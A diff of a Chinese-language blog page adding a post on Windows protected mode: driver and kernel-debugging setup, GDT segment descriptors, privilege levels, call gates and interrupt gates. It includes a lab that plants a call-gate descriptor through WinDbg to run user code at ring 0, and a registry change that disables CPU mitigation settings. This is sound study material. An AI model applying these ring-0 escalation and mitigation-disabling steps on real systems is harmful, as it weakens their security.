@@ -19,7 +19,515 @@ if (isPassword) {
   gitment: ,
   valine: ,
 }</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/SecondBC/atom.xml" title="Second_BC の BloG" type="application/atom+xml">
-</head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="author-info"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/SecondBC/ss.jpg"></div><div class="author-info-name">Second_BC</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/" target="_blank">GitHub<i class="icon-dot bg-color7"></i></a><a class="links-button button-hover" href="mailto:1" target="_blank">E-Mail<i class="icon-dot bg-color6"></i></a><a class="links-button button-hover" href="tencent://message/?uin=2&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color3"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/SecondBC/archives"><span class="pull-top">日志</span><span class="pull-bottom">39</span></a><a class="author-info-articles-tags article-meta" href="/SecondBC/tags"><span class="pull-top">标签</span><span class="pull-bottom">10</span></a><a class="author-info-articles-categories article-meta" href="/SecondBC/categories"><span class="pull-top">分类</span><span class="pull-bottom">3</span></a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/SecondBC">首页</a><a class="menu-item" href="/SecondBC/archives">归档</a><a class="menu-item" href="/SecondBC/categories">分类</a><a class="menu-item" href="/SecondBC/tags">标签</a><a class="menu-item" href="/SecondBC/about">关于</a></nav><div class="right-info"><a class="title-name" href="/SecondBC/">Second_BC の BloG</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><div id="recent-posts"><!-- each post in page.posts.sort('date', -1).limit(10).toArray()--><!-- config中配置按照什么排序--><div class="recent-post-item"><a class="post-title" href="/SecondBC/2024/10/30/%E6%A0%88%E6%BA%A2%E5%87%BA%E8%BF%9B%E9%98%B6/">栈溢出进阶</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2024-10-30</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/categories/Diary/">Diary</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/tags/Pwn/">Pwn</a></div></div><div class="post-content"><div class="main-content content"><p>所用题目可在<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/">中级ROP - CTF Wiki (ctf-wiki.org)</a>找到；</p>
+</head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="author-info"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/SecondBC/ss.jpg"></div><div class="author-info-name">Second_BC</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/" target="_blank">GitHub<i class="icon-dot bg-color10"></i></a><a class="links-button button-hover" href="mailto:1" target="_blank">E-Mail<i class="icon-dot bg-color9"></i></a><a class="links-button button-hover" href="tencent://message/?uin=2&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color4"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/SecondBC/archives"><span class="pull-top">日志</span><span class="pull-bottom">40</span></a><a class="author-info-articles-tags article-meta" href="/SecondBC/tags"><span class="pull-top">标签</span><span class="pull-bottom">10</span></a><a class="author-info-articles-categories article-meta" href="/SecondBC/categories"><span class="pull-top">分类</span><span class="pull-bottom">3</span></a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/SecondBC">首页</a><a class="menu-item" href="/SecondBC/archives">归档</a><a class="menu-item" href="/SecondBC/categories">分类</a><a class="menu-item" href="/SecondBC/tags">标签</a><a class="menu-item" href="/SecondBC/about">关于</a></nav><div class="right-info"><a class="title-name" href="/SecondBC/">Second_BC の BloG</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><div id="recent-posts"><!-- each post in page.posts.sort('date', -1).limit(10).toArray()--><!-- config中配置按照什么排序--><div class="recent-post-item"><a class="post-title" href="/SecondBC/2024/12/16/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E5%BC%95%E5%85%A5-Windows%E9%A9%B1%E5%8A%A8%E7%BC%96%E7%A8%8B%E4%B8%80/">保护模式引入-Windows驱动编程一</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2024-12-16</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/categories/Diary/">Diary</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/tags/Win/">Win</a></div></div><div class="post-content"><div class="main-content content"><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>对于以下理论，不提及环境均是32位操作系统上的；</p>
+<p>使用VS系列搭配对应windows版本和SDK,WDK版本进行开发；</p>
+<p>这里使用VS2015，win10，SDK和WDK版本10.0.14393（不要用VS2022，写不了32位驱动）；</p>
+<p>对于驱动环境的搭建在b站有详细的教程；</p>
+<p>简略来说，先要搜索WDK，进入其下载界面，找到与之对应windows系统版本的WDK下载，但是不要安装，只是看清楚WDK的版本，下载与之对应的VS版本之后，选择同样版本的SDK下载，最后才安装WDK；</p>
+<p>这个流程会帮你省很多不必要的麻烦；</p>
+<p>在创建项目的界面此时就会有Driver选项了；</p>
+<p>选择 空WDM驱动 模板，进入后删除其中自带的文件，创建一个main.c即可开始编写；</p>
+<p>一个具体的驱动模板如下（类似于控制台程序的 int main()）：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//卸载函数</span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//驱动入口 main</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是，把属性里面的把警告视为错误给关了，不然编译不通过；</p>
+<p>当你编译通过，生成了sys文件之后，说明环境没问题了；</p>
+<p>对于驱动的双机调试，需要准备一个windows虚拟机，我用到的是win7（x86）；</p>
+<p>打开虚拟机，用管理员方式打开cmd，输入如下的指令：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /<span class="built_in">copy</span> &#123;current&#125; /d debug    #拷贝当前引导为一个新引导叫做debug 这条指令完之后会获得一个ID</span><br><span class="line">bcdedit /displayorder &#123;id&#125; /addlast #添加到显示</span><br><span class="line">bcdedit /dbgsettings SERIAL DEBUGPORT:<span class="number">1</span> BAUDRATE:<span class="number">115200</span> #给到调试频道</span><br><span class="line">bcdedit /bootdebug &#123;id&#125; ON			#开启启动时选择引导</span><br><span class="line">bcdedit /debug &#123;id&#125;		ON</span><br><span class="line">bcdedit /timeout <span class="number">30</span>					#超时</span><br></pre></td></tr></table></figure>
+
+<p>之后重启虚拟机，会发现可以选择debug进入，进入之后会一直卡着黑屏等待连接；</p>
+<p>此时关机，在设置中添加一个（串行端口）硬件：</p>
+<p><img src="https://s2.loli.net/2024/10/30/5amZ8JOqYKGghB1.png" alt="edit"></p>
+<p>选择使用命名的管道，管道名称输入 <code>//./pipe/com_1</code> (这个名称可以随便com_1 com_2都行)；</p>
+<p>把打印机硬件给移除掉，因为它会占用端口；</p>
+<p>这个时候找到你下载的WDK里面的windbg.exe，在Windows Kits文件夹里；</p>
+<p>新建一个bat文件，编辑内容为如下：</p>
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cmd</span> /k &quot;D:\Windows Kits\<span class="number">10</span>\Debuggers\x64\windbg.exe&quot; -y SRV*D:\symbol*http://msdl.microsoft.com/download/symbols -b -k com:port=//./pipe/com_1,baud=<span class="number">115200</span>,pipe</span><br></pre></td></tr></table></figure>
+
+<p>windbg路径填入自己对应的就行，要说明以下两条：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">com:<span class="title">port</span>=//./<span class="title">pipe</span>/<span class="title">com_1</span>,<span class="title">baud</span>=115200,<span class="title">pipe</span> #对应的管道名称要一样和<span class="title">vm</span>里设置的</span></span><br><span class="line"><span class="function"><span class="title">SRV</span>*<span class="title">D</span>:\<span class="title">symbol</span>*<span class="title">http</span>://<span class="title">msdl.microsoft.com</span>/<span class="title">download</span>/<span class="title">symbols</span> #这里是<span class="title">D</span>盘，可以设置其他的盘，它会从网上下载<span class="title">symbol</span>到这个盘的<span class="title">symbol</span>文件夹下</span></span><br></pre></td></tr></table></figure>
+
+<p>此时打开这个bat文件，就可以开始调试win7了；</p>
+<p>和VS调试一样，用F9断点，F10步过，F11步入进行；</p>
+<p>当断下点的时候，可以发现虚拟机win7动不了，冻住了，就说明挂载连接成功，可以进行调试；</p>
+<h2 id="保护模式"><a href="#保护模式" class="headerlink" title="保护模式"></a>保护模式</h2><p>这里是从80386架构引申出来的理论：</p>
+<p>实模式是在实地址上进行的，位长16，没有虚拟内存，虚拟地址的说法，一切都在物理地址上进行寻址；</p>
+<p>寻址公式：<br>$$<br>段地址 × 10h + 逻辑地址（偏移） == 线性地址（实际物理地址）<br>$$<br>例如一条指令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax, word ptr ds:[0x15555]</span><br><span class="line">ds = 2000h</span><br></pre></td></tr></table></figure>
+
+<p>那么实际上ax给到的值是 2000 * 10 + 15555 = 35555h地址里面的；</p>
+<p>这个模式并不安全，在其他进程里，只要知晓内核代码区域的段地址，就可以访问它的内存；</p>
+<p>所以引出了保护模式；</p>
+<p>保护模式在实模式的基础上增加了位长为32，同时引入虚拟地址的概念，即每个进程都是40W起始，但进程A的40W存放的东西和进程B的40W存放的地址并不相同，同时引入段页机制；</p>
+<p>要经过一系列多级页表，缓存快表的查询最终拿到A进程40W地址的真正物理地址，在物理地址上，一个进程很可能是离散存储的；</p>
+<p>这是内存页的概念；在windows中也有快表和页命中的机制，换出到磁盘上的页，一般在C盘的pagefile里；</p>
+<p>对于段的解释，则是进程对于不同部分，权限的划分；</p>
+<p>要玩转计算机，就要学好页和段的机制，如同想要pwn好，就要学好linux堆栈的机制一样；</p>
+<p>补充知识：CISC架构页一般4k，RISC架构页一般2k；</p>
+<p>CISC和RISC还有不同的地方在于耗电量和脉冲频率，前者会大于后者，所以跑的快；</p>
+<h2 id="段"><a href="#段" class="headerlink" title="段"></a>段</h2><h3 id="引入和介绍"><a href="#引入和介绍" class="headerlink" title="引入和介绍"></a>引入和介绍</h3><p>在32位保护模式下，段寄存器存的并不是一个实际地址，不遵守上面的规则，实则是一个表的索引；</p>
+<p>当段寄存器通过表拿到基址之后，才遵守寻址规则，此时的（段地址*0x10）就相当于基址，但计算得到的仍然是虚拟地址，通过页表才能拿到物理地址；</p>
+<p>所以在保护模式下的段这个概念，实际上都是虚拟的，只是和权限挂钩；</p>
+<p>下图为段选择符（段选择子）：</p>
+<p><img src="https://s2.loli.net/2024/10/31/dgN8Blc7VKoHnLy.png" alt="段选择符"></p>
+<p>比如ds，此时存放的值为0x2b，将其转换为二进制 00000000 00101011</p>
+<p>那么按照上述段选择符的描述进行查看： 0000000000101 0 11</p>
+<p>此时RPL为11，代表请求权限；</p>
+<p>TI此时为0，代表要访问的表，其中有GDT和LDT，一个是全局描述表，一个是局部描述表，一般而言都是用的GDT；</p>
+<p>101对应10进制为：5，查找GDT表的第五项；</p>
+<p>在windbg里，有一个命令可以查看gdt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r gdtr</span><br></pre></td></tr></table></figure>
+
+<p>执行后能获取gdt的地址，使用dq dd查看gdt地址的存放数据，可以拿到表项内容；</p>
+<p>对于表项的修改可以用 eq ed进行修改；</p>
+<p>我们直接拿windbg获取的gdt表内容如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dqs fffff80259e7dfb0  </span><br><span class="line">fffff802`<span class="number">59e7</span>dfb0  <span class="number">00000000</span>`<span class="number">00000000</span>    <span class="comment">//这是表的第0项，是个数组</span></span><br><span class="line">fffff802`<span class="number">59e7</span>dfb8  <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">fffff802`<span class="number">59e7</span>dfc0  <span class="number">00209b</span>00`<span class="number">00000000</span></span><br><span class="line">fffff802`<span class="number">59e7</span>dfc8  <span class="number">00409300</span>`<span class="number">00000000</span></span><br><span class="line">fffff802`<span class="number">59e7</span>dfd0  <span class="number">00</span>cffb00`<span class="number">0000f</span>fff</span><br><span class="line">fffff802`<span class="number">59e7</span>dfd8  <span class="number">00</span>cff300`<span class="number">0000f</span>fff	<span class="comment">//表的第5项，ds指向的地方</span></span><br><span class="line">fffff802`<span class="number">59e7</span>dfe0  <span class="number">0020f</span>b00`<span class="number">00000000</span></span><br><span class="line">fffff802`<span class="number">59e7</span>dfe8  <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">fffff802`<span class="number">59e7</span>dff0  <span class="number">59008b</span>e7`c0000067</span><br><span class="line">fffff802`<span class="number">59e7</span>dff8  <span class="number">00000000</span>`fffff802</span><br><span class="line">fffff802`<span class="number">59e7</span>e000  <span class="number">0040f</span>300`<span class="number">00003</span>c00</span><br><span class="line">fffff802`<span class="number">59e7</span>e008  <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">fffff802`<span class="number">59e7</span>e010  <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">fffff802`<span class="number">59e7</span>e018  <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">fffff802`<span class="number">59e7</span>e020  <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">fffff802`<span class="number">59e7</span>e028  <span class="number">00000000</span>`<span class="number">00000000</span></span><br></pre></td></tr></table></figure>
+
+<p>表中每个成员占8字节；</p>
+<p>这些成员实际上叫做段描述符：<br><img src="https://s2.loli.net/2024/10/31/hjm9B3woazXVirP.png" alt="段描述符"></p>
+<p>00cff300`0000ffff</p>
+<p>其中Segment Limit是限长，允许逻辑地址访问的最大长度，在这里是ffff</p>
+<p>Seg Limit 19:16是作为Segment Limit的高位补充，所以Segment Limit整体是f ffff</p>
+<p>Base Address是基址，这里是 0000</p>
+<p>同时，Base 31:24和23:16是作为Base Address的高位补充，即Base Address整体应该是00 00 0000；</p>
+<p>那现在就剩下c f3这12bit了；</p>
+<p>举个例子，有如下代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov eax,dword ptr ds:[0x12345678]</span><br></pre></td></tr></table></figure>
+
+<p>实际上是把基址0 + 0x12345678得到的地址的内容给到了eax；</p>
+<p>而如果ds:[]括号里面的数据大于了4G，就会异常中断；</p>
+<p>将所有数据对应翻译如下：</p>
+<hr>
+<p>limit：fffff 20位，从0开始算（如果是0，则限长为1）</p>
+<p>base：00000000 基址为0</p>
+<p>type：3 段的权限！</p>
+<p>s：1</p>
+<p>DPL：3</p>
+<p>P（有效位）：1</p>
+<p>AVL（保留字）：0 </p>
+<p>L：0 默认为0</p>
+<p>D/B：1</p>
+<p>G（粒度）：1 这个地方为1，limit以页为单位，否则以字节为单位，此时这个段管理4G内存（limit 4G）</p>
+<hr>
+<p><img src="https://s2.loli.net/2024/10/31/Lbth5R861ZCYUy2.png" alt="type图"></p>
+<p>以上是type数值对应段的权限；</p>
+<p>可以看到上面每隔一个描述，都会有一个accessed，它代表这个段被使用过；</p>
+<p>如果将gdt一个成员设置为type：2，再给到ds这个成员，这个时候，2会+1变成3；</p>
+<p>对于expand-down，叫做向下生长，即base和limit之间的区域变成不可访问（无权限）的状态，而其他没有包含的内存（4G中的其他地方）可以访问（和不带expand-down相反，不带的称作向上生长）；</p>
+<p>对于conforming（一致）描述是用于纯段模式下，应用层可以直接调用cs描述的代码段（内核）；</p>
+<p>当写内容到没有写权限的段时，就会发生异常中断；</p>
+<p>从上述内容可以总结得到的信息为：需要遵守段的限长，读写权限，以及段寄存器寻表项，base是什么的内容；</p>
+<p>对于更改cs的补充：可以直接更改ds，es，但是不允许直接更改cs，可以通过jmp进行间接更改：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp far 0x4b:address</span><br></pre></td></tr></table></figure>
+
+<p>它会跳转后将cs更改为0x4b，称为跨段跳转，不提权；</p>
+<p><strong>在win10上貌似不能用这样的方法改动cs？（为什么呢？）</strong></p>
+<p>也可以使用call：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call far 0x4b:address</span><br></pre></td></tr></table></figure>
+
+<p>这个时候栈里会压入旧的CS值，以及返回地址；</p>
+<p>栈结构：</p>
+<table>
+<thead>
+<tr>
+<th>eip</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>cs</td>
+</tr>
+</tbody></table>
+<p>在内联汇编中还不能直接写call一个立即数，需要用到一个数组：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//32位</span></span><br><span class="line">BYTE buff[<span class="number">6</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x4b</span>,<span class="number">0</span>&#125;;</span><br><span class="line">((<span class="keyword">int</span>*)buff)[<span class="number">0</span>] = address;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">    jmp far buff</span><br><span class="line">    <span class="comment">//等效于call fword ptr buff</span></span><br><span class="line">    call far buff <span class="comment">//使用retf返回以平衡栈</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="D-B"><a href="#D-B" class="headerlink" title="D/B"></a>D/B</h3><p>对于每个段描述不同；</p>
+<p>对于cs而言，d/b为0，在32位下，默认操作数为16位，否则为32位；</p>
+<p>举例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">push 12</span><br></pre></td></tr></table></figure>
+
+<p>上述操作会将esp-4，但当cs的d/b为0时，只会让esp-2；</p>
+<p>对于ss而言，d/b为0，在32位下，栈寻址会变为16位，否则为32位；</p>
+<p>相当于使用sp寻址（两字节地址），而不是esp；</p>
+<p>作用在普通的code段上（ds，es），d/b是0是1都无所谓，没有改变；</p>
+<h3 id="DPL"><a href="#DPL" class="headerlink" title="DPL"></a>DPL</h3><p>全称：描述权限等级；</p>
+<p>代表这个段描述符的权限；一般只有0和3的数值，代表的是0环权限和3环权限；</p>
+<p>当CS段和SS段同时DPL为3时，代表程序跑在应用层，同时为0时，代表程序跑在内核层；</p>
+<p>补充CPL：当前权限等级，即CS段的DPL；</p>
+<p>RPL：在之前的段选择子里出现过，后三位，代表请求权限等级，例如DS为2b，RPL为3，那么就是以3环身份请求访问这段段的内存空间；</p>
+<p>在普通数据段下（DS,ES），RPL是无所谓的，没有效果的，但在SS上RPL一定要和DPL，CPL对应相同，不然就会G掉；</p>
+<p>对于CS段，RPL也是无所谓的，只需要DPL和CPL对应相同；</p>
+<h2 id="调用门"><a href="#调用门" class="headerlink" title="调用门"></a>调用门</h2><p>之前在段节里讲的都是一般的代码段和数据段，当s位为1时是如此，但当s位为0时，此时变成系统段，type含义发生变化，具体type内容如下所示：</p>
+<p><img src="https://s2.loli.net/2024/11/02/32hklQSJuZdAFB8.png" alt="type"></p>
+<p>当s为0，type为c时，此时这个段被描述为调用门；</p>
+<p>描述符发生变化如下：</p>
+<p><img src="https://s2.loli.net/2024/11/02/B2stCDwrEkPcFqe.png" alt="call gate"></p>
+<p>首先，P，DPL，Type的概念不变，后面三个0是默认为0，后面5字节是代表有多少个参数入栈，Segment Selector是新的cs的值，offset则是要去地址的偏移（逻辑地址），加上的base是新给到的cs里面的，而不是当前的cs的base；</p>
+<p>进入调入门后，更改cs的同时，<strong>会同步更改ss的值为cs的下一个项</strong>；</p>
+<p>要进入调用门也需要使得DPL和当前cs和ss的DPL值一样；</p>
+<p>所以它的意思是，当进入调用门时，进行跨段跳转（call），可提权，如要提权则构造两个段描述符，其DPL为0，分别给到cs和ss就行；</p>
+<p>如果提权了，FS寄存器里的值会变化，所以进入r0时，需要保存fs的值（int 3的问题）；</p>
+<p>进入r0，栈也会发生变化，变成r0的栈，其中存的有返回地址，旧的cs，ss值，旧的栈的esp值；</p>
+<p>而r3的原本栈并不会发生改变；</p>
+<p>栈结构：</p>
+<table>
+<thead>
+<tr>
+<th>eip</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>cs</td>
+</tr>
+<tr>
+<td>参数</td>
+</tr>
+<tr>
+<td>esp</td>
+</tr>
+<tr>
+<td>ss</td>
+</tr>
+</tbody></table>
+<p>要使用调用门，则将cs的值改为调用门就行，但是需要更改注册表项：<br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management的下面两个值：</p>
+<p>FeatureSettingsOverrideMask和FeatureSettingsOverride都改为3；</p>
+<p>不然使用调用门就会G掉；</p>
+<p><strong>一个问题：为什么使用跨段跳跃直接跳到DPL为0的段修改不行呢？</strong></p>
+<p>答：DPL需要等于当前CPL！所以需要借助调用门进行提权；</p>
+<h3 id="提权小实验"><a href="#提权小实验" class="headerlink" title="提权小实验"></a>提权小实验</h3><p>查看gdtr如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dq 80b99000</span><br><span class="line">ReadVirtual: 80b99000 not properly sign extended</span><br><span class="line">80b99000  00000000`00000000 00cf9b00`0000ffff</span><br><span class="line">80b99010  00cf9300`0000ffff 00cffb00`0000ffff</span><br><span class="line">80b99020  00cff300`0000ffff 80008b1e`400020ab</span><br><span class="line">80b99030  834093f7`9c003748 0040f300`00000fff</span><br><span class="line">80b99040  0000f200`0400ffff 00000000`00000000</span><br><span class="line">80b99050  830089f7`70000068 830089f7`70680068</span><br><span class="line">80b99060  00000000`00000000 00000000`00000000</span><br><span class="line">80b99070  800092b9`900003ff 00000000`00000000</span><br></pre></td></tr></table></figure>
+
+<p>可以通过调试发现，应用程序在运行时，CS为1b，SS为23；</p>
+<p>分别对应这张表里的3，4项；</p>
+<p>可以发现这张表里的1，2项和3，4项是类似的，只是它们的DPL都为0，而3，4项的DPL都为3；</p>
+<p>所以可以通过调用门将CS的值改到1项，SS自动设为2项；</p>
+<p>构造调用门结构：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">首先我们要跳转的地址为函数test：（401000h 关闭随机化地址）</span><br><span class="line">那么结构如： 0040xxxx`xxxx1000</span><br><span class="line">要改到的cs值为第1项，也就是0b: 0040xxxx`000b1000</span><br><span class="line">没有参数，且P为1，DPL为3，S为0，type为C：0040ec00`000b1000</span><br></pre></td></tr></table></figure>
+
+<p>将其复制到4b（第9项）位置；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">80b99040  0000f200`0400ffff 0040ec00`000b1000</span><br></pre></td></tr></table></figure>
+
+<p>那么只需要通过跨段跳转去访问调用门就行了：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> g_1 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">void</span> _declspec(naked) test()</span><br><span class="line">&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        mov eax, dword ptr ds:[<span class="number">0x80b99014</span>]</span><br><span class="line">        mov g_1, eax</span><br><span class="line">        retf</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BYTE buff[<span class="number">6</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x4b</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p \n&quot;</span>,test); <span class="comment">//401000</span></span><br><span class="line">    <span class="comment">//printf(&quot;%p \n&quot;,*(int*)(0x80b99010)); //直接访问异常</span></span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">		push fs</span><br><span class="line">        call fword ptr buff <span class="comment">//跨段跳跃</span></span><br><span class="line">        pop fs</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x \n&quot;</span>,g_1); <span class="comment">//进入test后访问的结果 cf9300</span></span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以了解的到，在test里的操作都是r0级别的，使用的栈也是另一个栈，不是原本进程的栈；</p>
+<p>同时只能用call提权，jmp无法提权，原因是当jmp访问调用门时，不会去改cs，ss（机器内部设定）；</p>
+<h2 id="中断门"><a href="#中断门" class="headerlink" title="中断门"></a>中断门</h2><p>除了GDT，还有一个IDT，叫中断表；</p>
+<p>中断表中存放的是中断门描述符；</p>
+<p>如下是中断门的描述符：</p>
+<p><img src="https://s2.loli.net/2024/11/02/3ZnRLItu6zSJFOq.png" alt="int"></p>
+<p>type中的D的意思是，在16位系统中为0，32位往上为1，所以type是e，s还是0；</p>
+<p>而其中段选择子，查找的依然是gdt；</p>
+<p>偏移指向的地址即为中断处理函数；</p>
+<p>通过int index去触发对应idt的表项的中断门，进入中断函数进行处理，同时权限更改为段选择子；</p>
+<p>那就可以自拟函数入口，段选择子改作r0级别进行如调用门一样的提权；</p>
+<p>注意，此时要使用 iretd 进行返回平衡栈，而不是retf；</p>
+<p>iretd实际上是做了一步sti的操作去改写了eflags的if位，同时解除阻塞；</p>
+<p>如果直接用retf返回，由于没有改写if位，在内核源码中会进行对这个位的比较，比较不为1就会进入蓝屏；</p>
+<p>同时不能直接在r3使用popfd去修改eflags，因为进入后会if自动设置为0；</p>
